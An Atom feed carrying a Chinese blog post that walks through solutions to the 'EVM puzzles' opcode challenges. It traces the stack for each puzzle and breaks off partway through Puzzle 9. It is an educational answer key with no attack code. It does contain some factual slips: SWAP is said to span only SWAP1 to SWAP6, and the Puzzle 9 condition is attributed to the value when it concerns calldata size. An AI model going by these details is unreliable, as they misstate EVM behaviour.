<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Banana69</title>
  
  
  <link href="https://banana69.site/atom.xml" rel="self"/>
  
  <link href="https://banana69.site/"/>
  <updated>2022-07-28T06:25:45.918Z</updated>
  <id>https://banana69.site/</id>
  
  <author>
    <name>Banana69</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Evm-puzzles题解</title>
    <link href="https://banana69.site/2022/07/28/evm-puzzles/"/>
    <id>https://banana69.site/2022/07/28/evm-puzzles/</id>
    <published>2022-07-27T16:00:00.000Z</published>
    <updated>2022-07-28T06:25:45.918Z</updated>
    
    <content type="html"><![CDATA[<p>Evm-puzzles 是一个以太坊操作码的挑战，每道题都会提供一些列操作码，并提示输入正确的交易值或者调用数据。通过Evm-puzzles可以了解EVM操作码的运行机制</p><p><img src="/images/evm-puzzles.assets/image-20220723142317912.png" alt="image-20220723142317912"></p><h3 id="Puzzle-1"><a href="#Puzzle-1" class="headerlink" title="Puzzle 1"></a>Puzzle 1</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 1 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      56      JUMP</span><br><span class="line">02      FD      REVERT</span><br><span class="line">03      FD      REVERT</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      FD      REVERT</span><br><span class="line">07      FD      REVERT</span><br><span class="line">08      5B      JUMPDEST</span><br><span class="line">09      00      STOP</span><br><span class="line"></span><br><span class="line">? Enter the value to send: (0)</span><br></pre></td></tr></table></figure><p>这道题提示需要输入一个发送的值，即向这个合约发送一笔交易，这个交易需要多少value才能不处罚 REVERT指令。</p><p>首先需要了解 CALLVALUE 指令，此操作会获取到负责此执行的指令/交易的值，并将该值推到堆栈的顶部，如果输入10，则在 CALLVALUE 指令执行后，堆栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">10</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>而 JUMP 的指令的作用是更改程序计数器，使栈顶的值 n 出栈，并跳转到第 n 条执行，JUMP 执行的跳转必须以 JUMPDEST 指令结束。</p><p>所以要想通过这道题，只需要输入 value 为8，CALLVALUE 指令将 8 压入栈顶，栈中结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>当执行到 JUMP 指令时栈顶的值为 8，然后跳转到第 8 条指令即 JUMPDEST，跳过所有 REVERT指令。</p><h3 id="Puzzle-2"><a href="#Puzzle-2" class="headerlink" title="Puzzle 2"></a>Puzzle 2</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 2 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      38      CODESIZE</span><br><span class="line">02      03      SUB</span><br><span class="line">03      56      JUMP</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      5B      JUMPDEST</span><br><span class="line">07      00      STOP</span><br><span class="line">08      FD      REVERT</span><br><span class="line">09      FD      REVERT</span><br></pre></td></tr></table></figure><p>这道题依然需要输入一个值，使程序在不执行 REVERT 指令的前提下运行。首先需要了解 CODESIZE 指令，此操作码获取在当前环境中运行的代码的大小。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Add some instructions to increase the code size</span></span><br><span class="line">PUSH29 <span class="number">0</span></span><br><span class="line">POP</span><br><span class="line">CODESIZE</span><br><span class="line"></span><br><span class="line"><span class="comment">//stack =&gt; 20</span></span><br></pre></td></tr></table></figure><p>puzzle2 中，可以通过查看序列有多少操作码来手动剪擦好代码的大小，每个操作码的大小是 1 byte，所以10个操作码的大小一共是 10 byte，而 EVM 中使用十六进制表示，即 0a 被压入栈顶。</p><p>SUB 指令是用栈顶元素的值减去栈中的第二个元素的值，然后将结果压入栈中，向上一题一样，如果需要跳过REVERT 指令，则需要跳转到第6条指令，由于在执行 CODESIZE 后栈顶元素的值为 0a（10） ，所以只需要使输入的值为4时，在执行 JUMP 前，栈顶元素的值为 6，即跳转到 JUMPDEST，完成该题目。</p><h3 id="Puzzle-3"><a href="#Puzzle-3" class="headerlink" title="Puzzle 3"></a>Puzzle 3</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 3 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36      CALLDATASIZE</span><br><span class="line">01      56      JUMP</span><br><span class="line">02      FD      REVERT</span><br><span class="line">03      FD      REVERT</span><br><span class="line">04      5B      JUMPDEST</span><br><span class="line">05      00      STOP</span><br></pre></td></tr></table></figure><p>这道题目中的操作码与之前基本一致，但是需要我们输入的不是交易时的 <strong>value</strong>，而是 <strong>calldata</strong>，即附加到 message 中的字节码。<code>args</code>也叫<code>calldata</code>，Calldata是不可修改的非持久性数据位置，所有传递给函数的值都存储在这里。与栈不同的地方的是，如果要使用calldata里面的数据，必须手动指定偏移量和读取的字节数，Calldata是外部函数的参数(而不是返回参数)的默认位置。（关于 calldata 可以参考<a href="https://learnblockchain.cn/2019/10/05/evm-data%EF%BC%89">https://learnblockchain.cn/2019/10/05/evm-data）</a></p><p>CALLDATASIZE 指令获取调用数据的大小（以字节为单位），并将其压入到堆栈中。所以我们只需要输入 CALLDATASIZE 的值为 4个字节，一个字节是8位，在16进制中一个字节为2个16进制位，只需要输入<code>0x11111111</code>，CALLDATASIZE 就会返回 4 个字节，即可让接下来的 JUMP 指令跳转到 JUMPDEST，完成该题目。</p><h3 id="Puzzle-4"><a href="#Puzzle-4" class="headerlink" title="Puzzle 4"></a>Puzzle 4</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 4 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      38      CODESIZE</span><br><span class="line">02      18      XOR</span><br><span class="line">03      56      JUMP</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      FD      REVERT</span><br><span class="line">07      FD      REVERT</span><br><span class="line">08      FD      REVERT</span><br><span class="line">09      FD      REVERT</span><br><span class="line">0A      5B      JUMPDEST</span><br><span class="line">0B      00      STOP</span><br></pre></td></tr></table></figure><p>解决这道题需要了解 XOR 指令，该指令会将俩个数字的二进制形式按位进行异或，如 5 和 3 的异或表示为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span>:<span class="number">00000000000000000000000000000101</span></span><br><span class="line"><span class="number">3</span>:<span class="number">00000000000000000000000000000011</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span> xor <span class="number">3</span>:<span class="number">00000000000000000000000000000110</span></span><br></pre></td></tr></table></figure><p>分析题目需要跳转到 JUMPDEST 指令，即第 10 条指令，意味着在执行 XOR 后栈顶的元素为 10(0A),，而 CODESIZE 执行后栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[0c your_input <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>所以当 0c 和 输入的值进行异或后得到的值为 0a，所以需要输入的值为 0a xor 0c == 6，即可完成该题目。</p><h3 id="Puzzle-5"><a href="#Puzzle-5" class="headerlink" title="Puzzle 5"></a>Puzzle 5</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 5 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34          CALLVALUE</span><br><span class="line">01      80          DUP1</span><br><span class="line">02      02          MUL</span><br><span class="line">03      610100      PUSH2 0100</span><br><span class="line">06      14          EQ</span><br><span class="line">07      600C        PUSH1 0C</span><br><span class="line">09      57          JUMPI</span><br><span class="line">0A      FD          REVERT</span><br><span class="line">0B      FD          REVERT</span><br><span class="line">0C      5B          JUMPDEST</span><br><span class="line">0D      00          STOP</span><br><span class="line">0E      FD          REVERT</span><br><span class="line">0F      FD          REVERT</span><br></pre></td></tr></table></figure><p>首先需要学习几个新的指令，<strong>DUP</strong> 指令表示复制栈顶上第一个位置的值，并将其压入栈顶，同样，dup2表示将栈中第二个位置的值复制并压入栈顶。dup指令包括dup1-dup16；<strong>MUL</strong>指令表示获取栈中的前俩个值，将他们相乘的结果压入栈顶；<strong>EQ</strong>指令表示获取栈中前俩个位置的值并比较运行结果，当运行结果相同时返回1，否则返回0，并将返回的结果压入栈顶。</p><p>在执行 DUP1 后栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[your_input your_input <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 MUL 操作，将前俩个值相乘，并将结果压入栈顶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[mul_result <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>此时执行 PUSH2 0100，将2个字节的十六进制数0100（256）压入栈顶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0100</span> mul_result <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 EQ 操作，判断堆栈上的前俩个值，比较其值是否相同，假设相等，将 1压入栈顶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行  PUSH1 0，它将 <code>0c</code> 压入栈顶，JUMPI 表示有条件的跳转，它有俩个参数，第一个参数表示跳转的位置，第二个参数表示是否跳转，此时栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[0c <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>当栈中的第二个元素的值为 1 时，发生跳转，跳转到位置 0c，正好是 JUMPDEST，完成该题目。所以往上推输入的值应该是16，使 ${input}^2=256$，然后通过 EQ 判断，执行 JUMPI。</p><h3 id="Puzzle-6"><a href="#Puzzle-6" class="headerlink" title="Puzzle 6"></a>Puzzle 6</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 6 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      6000      PUSH1 00</span><br><span class="line">02      35        CALLDATALOAD</span><br><span class="line">03      56        JUMP</span><br><span class="line">04      FD        REVERT</span><br><span class="line">05      FD        REVERT</span><br><span class="line">06      FD        REVERT</span><br><span class="line">07      FD        REVERT</span><br><span class="line">08      FD        REVERT</span><br><span class="line">09      FD        REVERT</span><br><span class="line">0A      5B        JUMPDEST</span><br><span class="line">0B      00        STOP</span><br></pre></td></tr></table></figure><p>这道题遇到了新的指令<code>CALLDATALOAD</code>，该指令需要一个参数 **CALLDATALOAD(p)**表示从附加在交易中的 <strong>calldata</strong> 中获取数据，即从位置 p 的开始获取调用数据。例如，当栈顶为 08 时，执行 <strong>CALLDATALOAD</strong> 表示，所有从 byte 8 到 byte 32 的 calldata会被压入栈顶，如果 calldata 是 64 字节并且需要访问序列的第二个 32 个字节，可以先压入<code>20</code>堆栈，然后使用<code>CALLDATALOAD</code>来获取序列的第二个 32 个字节。</p><p>所以这道题需要输入的 calldata 为 a，但是由于在发送 calldata 时，当 calldata 不满足32字节时会从左向右进行填充，所以 0a 就会变成 <code>a00000000000000000000000000000000000000000000000000000000000000</code>，所以可以向 0x0a 在左边填充 0 即：<code>0x000000000000000000000000000000000000000000000000000000000000000a</code>。</p><h3 id="Puzzle-7"><a href="#Puzzle-7" class="headerlink" title="Puzzle 7"></a>Puzzle 7</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 7 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1</span><br><span class="line">04      37        CALLDATACOPY</span><br><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br><span class="line">0B      3B        EXTCODESIZE</span><br><span class="line">0C      6001      PUSH1 01</span><br><span class="line">0E      14        EQ</span><br><span class="line">0F      6013      PUSH1 13</span><br><span class="line">11      57        JUMPI</span><br><span class="line">12      FD        REVERT</span><br><span class="line">13      5B        JUMPDEST</span><br><span class="line">14      00        STOP</span><br></pre></td></tr></table></figure><p><code>CALLDATASIZE</code>需要输入特定大小的 calldata 来解决这个难题，calldata 的大小的值被压入栈后，继续执行<code>PUSH1 00</code>，<code>DUP1</code>，此时栈中的结构是：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> calldata_size <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>CALLDATACOPY</strong> 指令，该指令从交易中复制数据并将其保存在内存中，执行 <strong>CALLDATACOPY</strong> 需要三个参数，<code>[destOffset offset size]</code>，destOffset 表示要存储复制结果的偏移量，offset 表示要复制的调用数据中的字节偏移量，size表示复制的大小。</p><p>在执行 <strong>CALLDATACOPY</strong> 时，<code>destOffset</code>告诉程序内存中的哪个槽来存储从 calldata 复制的数据。<code>offset</code>表示从哪里开始复制调用数据（就像<code>CALLDATALOAD</code>在最后一个示例中确实如此）并且<code>size</code>告诉程序要在内存中存储多少字节序列。在这个过程中，栈顶的所有三个元素都被消耗掉了，所以在执行完 CALLDATACOPY 后栈中的结构是：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>当<code>CALLDATALOAD</code>指令执行时，它会将 calldata 存储在 memory slot<code>0</code>中，从 byte 开始<code>0</code>，并存储整个 calldata 的大小。</p><p>紧接着会执行<code>CALLDATASIZE</code> <code>PUSH1 00</code> <code>PUSH1 00</code>，执行完后栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> calldata_size <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>CREATE</strong> 指令，该指令会创建一个账户（合约或EOA）。执行 CRATE 指令时需要三个参数，[value offset size]，value 是发送创建合约的 wei 的值，offset 是部署时运行的字节码的内存位置，size 表示字节码的大小。当使用 CREATE 部署新合约时，偏移量的字节码不是新合约的字节码，而是在部署期间被执行的偏移量的字节码，并且返回值是新创建合约的字节码。</p><blockquote><p>这里理解起来有一些抽象，举个例子，如果使用 CREATE 指令来创建一个合约，且部署这个合约的字节码为<code>0x6160016000526002601Ef3</code>，那么由此字节码序列的返回值为 <strong>6001</strong>，因此新创建的合约的字节码为 <strong>6001</strong>，即<code>PUSH1 01</code>，所以当调用这个合约的执行就会执行<code>PUSH1 01</code>。</p></blockquote><p>当 <strong>CREATE</strong> 指令执行后，栈顶的三个值被使用，并且被部署的合约的地址会被压入栈顶，在执行完成后，栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p> 然后就会遇到 <strong>EXTCODESIZE</strong> 指令，该指令需要一个参数，即 **EXTCODESIZE(p)**，返回 p 处的代码的大小。执行完成后继续执行 <code>PUSH1 01</code>，此时栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">01</span> address_code_size <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>紧接着执行 EQ 指令，会检查栈中前俩个值是否相等，并将判断结果压入栈中，然后继续执行<code>PUSH1 13</code>和<code>JUMPI</code>，压入栈中的 13 即表示 条件跳转的位置，而 EQ 判断的结果表示是否跳转，即意味着我们要提供一个使<code>address_code_size == 01 </code>的 calldata 。</p><p>所以我们只需要传入一个 calldata 使得执行，EXTCIDESIZE 时返回的结果为 1即可。执行 CREATE 操作码时，只有 RETURN 操作码返回的代码才是未来调用部署合约时执行的“运行时代码”。字节码的另一部分只使用一次，仅用于构造函数部分。字节码的另一部分只使用一次，仅用于该<code>constructor</code>部分。因此，我们<code>calldata</code>可以在其中包含我们想要的所有代码，但我们需要确保返回的代码（运行时代码）只有 1 条指令。我们希望我们部署的智能合约只有<code>STOP</code>指令（操作码<code>00</code>）。必须发送到<code>CREATE</code>操作码的代码是这样的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUSH1 00 // 00 代表STOP</span><br><span class="line">PUSH1 00 // 这将用作 MSTORE8 的偏移量，在内存中存储 1 个字节</span><br><span class="line">MSTORE8 // 将从偏移量 0 开始在内存中存储 `00` 值（来自第一个 PUSH1）</span><br><span class="line"></span><br><span class="line">PUSH1 01 // 返回多少字节</span><br><span class="line">PUSH1 00 // 从哪个内存偏移量返回这些字节</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure><p>上面的操作码转为字节码就是<code>0x600060005360016000F3</code>，所以我们只需要将其作为 calldata 传入即可完成该题目，它将使用该 calldata 来创建和部署一个新合约，该合约的运行时代码为<code>00（STOP）</code></p><h3 id="Puzzle-8"><a href="#Puzzle-8" class="headerlink" title="Puzzle 8"></a>Puzzle 8</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 8 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1</span><br><span class="line">04      37        CALLDATACOPY</span><br><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br><span class="line">0B      6000      PUSH1 00</span><br><span class="line">0D      80        DUP1</span><br><span class="line">0E      80        DUP1</span><br><span class="line">0F      80        DUP1</span><br><span class="line">10      80        DUP1</span><br><span class="line">11      94        SWAP5</span><br><span class="line">12      5A        GAS</span><br><span class="line">13      F1        CALL</span><br><span class="line">14      6000      PUSH1 00</span><br><span class="line">16      14        EQ</span><br><span class="line">17      601B      PUSH1 1B</span><br><span class="line">19      57        JUMPI</span><br><span class="line">1A      FD        REVERT</span><br><span class="line">1B      5B        JUMPDEST</span><br><span class="line">1C      00        STOP</span><br></pre></td></tr></table></figure><p>这道题目又会遇到几个新的指令：</p><ul><li><p><strong>SWAP5：</strong>将位置 0 中的操作码与位置 5 的操作码交换， SWAP 操作包括 SWAP1～SWAP6。</p></li><li><p><strong>GAS：</strong>将交易中剩余的 gas 压入堆栈，会消耗 2 gas。</p></li><li><p><strong>CALL：</strong>创建一个新的子上下文（与外部交互的每个操作都会创建一个新的上下文），并执行外部账户中存在的代码没，如果调用失败，则将 0 压入栈中，否则将 1 压入栈中。如果调用的账户中没有代码，则返回 true。 <strong>CALL</strong> 操作需要 7 个参数，</p><p>— <code>gas</code>：要发送到为执行创建的子上下文的 gas 量<br>— <code>address</code>：将执行上下文的地址<br>— <code>value</code>：以“wei”为单位的值以发送到地址<br>— <code>argsOffset</code>：内存中的字节偏移量（以字节数为单位）<br>— <code>argsSize</code>：从内存中复制的字节大小，具有先前指定的偏移量<br>— <code>retOffset</code>：内存中的字节偏移量，以字节为单位存储执行返回的返回数据<br>— <code>retSize</code>：要从返回的数据中复制的字节大小</p></li></ul><p>然后再来分析代码过程，首先会执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CALLDATASIZE</span><br><span class="line">PUSH1 00</span><br><span class="line">DUP1</span><br><span class="line">CALLDATACOPY</span><br><span class="line">CALLDATASIZE</span><br><span class="line">PUSH1 00</span><br><span class="line">PUSH1 00</span><br><span class="line">CREARTE</span><br></pre></td></tr></table></figure><p>我们传入的 CALLDATA 会创建一个新的合约地址并返回部署地址，当以上操作执行完成后，栈中的结构为</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>接下来执行 5 条与 <strong>CALL</strong> 有关的指令，然后执行 <strong>CALL</strong> 指令，该指令创建一个新的子上下文并执行给定帐户的代码，然后回到当前的账户。即 <strong>CALL</strong> 指令用于与另一个合约进行交互</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUSH1 00</span><br><span class="line">DUP1</span><br><span class="line">DUP1</span><br><span class="line">DUP1</span><br><span class="line">DUP1</span><br></pre></td></tr></table></figure><p>当以上执行被执行完后，栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 <strong>SWAP5</strong> ，该指令会将栈中的第 0 个和第 5 个值进行交换，执行完成后，栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 <strong>CALL</strong> 指令，如果子上下文恢复，则返回 0，否则返回 1。在 <strong>CALL</strong> 指令执行完后，会继续执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUSH1 00</span><br><span class="line">EQ</span><br></pre></td></tr></table></figure><p>意味着需要如果要继续向下执行，就需要 <strong>EQ</strong> 返回 0，即意味着 <strong>CALL</strong> 也需要返回 0。所以就需要输入导致 <strong>CALL</strong> 执行失败的 <strong>CALLDATA</strong>。要让 <strong>CALL</strong> 执行失败有三种方法：</p><ol><li>没有足够的gas</li><li>栈中的参数不够</li><li>如果当前执行的上下文来自 <strong>STATICCALL</strong>，并且wei 的值不是 0。</li></ol><p>需要注意的是，如果 <strong>CALL</strong> 调用的地址中没有代码，那么 <strong>CALL</strong> 会始终返回 true。</p><p>在部署时运行的字节码的返回值会成为新创建的合约的合约的字节码，所以我们可以利用字节码传入 <strong>CALLDATA</strong>，使该字节码在运行时返回 <strong>REVERT</strong> 即可。，所以我们需要传递的数据是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//将 REVERT 的操作码作为合约代码存储在内存中</span><br><span class="line">PUSH1 FD</span><br><span class="line">PUSH1 00</span><br><span class="line">MSTORE 8</span><br><span class="line"></span><br><span class="line">//使构造函数返回存储的运行时代码</span><br><span class="line">PUSH1 01</span><br><span class="line">PUSH1 00</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure><p>即 <strong>CALLDATA</strong> 是 <code>0x60FD60005360016000F3</code> 。</p><h3 id="Puzzle-9"><a href="#Puzzle-9" class="headerlink" title="Puzzle 9"></a>Puzzle 9</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 9 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6003      PUSH1 03</span><br><span class="line">03      10        LT</span><br><span class="line">04      6009      PUSH1 09</span><br><span class="line">06      57        JUMPI</span><br><span class="line">07      FD        REVERT</span><br><span class="line">08      FD        REVERT</span><br><span class="line">09      5B        JUMPDEST</span><br><span class="line">0A      34        CALLVALUE</span><br><span class="line">0B      36        CALLDATASIZE</span><br><span class="line">0C      02        MUL</span><br><span class="line">0D      6008      PUSH1 08</span><br><span class="line">0F      14        EQ</span><br><span class="line">10      6014      PUSH1 14</span><br><span class="line">12      57        JUMPI</span><br><span class="line">13      FD        REVERT</span><br><span class="line">14      5B        JUMPDEST</span><br><span class="line">15      00        STOP</span><br></pre></td></tr></table></figure><p>首先了解俩个新的指令：</p><ul><li><strong>LT：</strong> 从栈中弹出两个值并判断<code>value0 &lt; value1</code>，将其结果压入栈中，若为真则压入 1，否则压入 0</li><li><strong>CALLVALUE:</strong> 将当前调用的 wei 的值压入栈中</li></ul><p>首先看第一处的 <strong>JUMPI</strong>，在执行完 <strong>JUMPI</strong> 指令之前栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">09</span> LT_result  <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>所以需要执行 <strong>JUMPI</strong> 的条件就是 <strong>LT_result</strong> 不为 0，即输入的 value 需要 大于 3。</p><p>然后继续执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CALLVALUE</span><br><span class="line">CALLDATASIZE</span><br><span class="line">MUL</span><br><span class="line">PUSH1 08</span><br><span class="line">EQ</span><br><span class="line">PUSH1 14</span><br><span class="line">JUMPI</span><br></pre></td></tr></table></figure><p> 在执行 <strong>JUMPI</strong> 之前，栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">14</span> EQ_result  <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> 